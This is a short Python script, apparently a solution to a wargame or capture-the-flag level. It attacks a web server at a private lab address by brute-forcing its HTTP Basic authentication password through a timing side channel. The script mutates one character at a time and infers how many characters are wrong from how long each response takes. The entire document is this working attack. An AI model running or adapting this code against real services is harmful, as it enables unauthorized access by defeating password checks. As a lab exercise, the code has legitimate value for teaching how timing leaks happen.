#!/usr/bin/env python
import socket
import base64
import time
import string
import random

# use this one first to get the right secret

TCP_IP = '10.0.0.1'
TCP_PORT = 20004
BUFFER_SIZE = 1024
CHARSET = list(string.ascii_lowercase+string.ascii_uppercase+string.digits)


def create_http_request(uri, password):
	request = "GET "+uri+" HTTP/1.0\nAuthorization: Basic "+base64.b64encode(password)+"\n"
	return request

def generate_password(old, which):
	if which == -1:
		return old
	new = list(old)
	new[int(which)] = CHARSET[random.randint(0, len(CHARSET)-1)]
	return "".join(new)

badchars = 17	# making sure the first round is baaad
badchars = 16
password = "-"*16
while True:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((TCP_IP, TCP_PORT))
	password = generate_password(password, 16-badchars)
	httprequest = create_http_request("/", password)
	before = time.time()
	s.send(httprequest)
	while True:
		data = s.recv(BUFFER_SIZE)
		if not data:
			break
#		print data
	after = time.time()
	badchars2 = badchars
	badchars = round((after - before)/0.0025-0.49)
	print password + "=" + str(badchars)
	if (badchars2 < badchars):
		badchars = badchars2
	s.close()

